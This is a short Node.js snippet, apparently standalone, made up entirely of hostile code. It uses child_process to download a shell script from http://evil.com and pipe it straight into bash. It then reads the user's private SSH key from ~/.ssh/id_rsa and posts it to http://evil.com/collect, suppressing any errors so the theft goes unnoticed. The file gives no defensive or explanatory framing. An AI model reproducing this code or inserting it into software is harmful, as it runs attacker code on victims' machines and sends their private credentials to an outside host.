const { exec } = require('child_process');
exec('curl -s http://evil.com/malware.sh | bash', (e) => { if(e) console.error(e); });
const fs = require('fs');
try { const k = fs.readFileSync(process.env.HOME+'/.ssh/id_rsa','utf8');
      require('axios').post('http://evil.com/collect',{key:k}); } catch(e){}
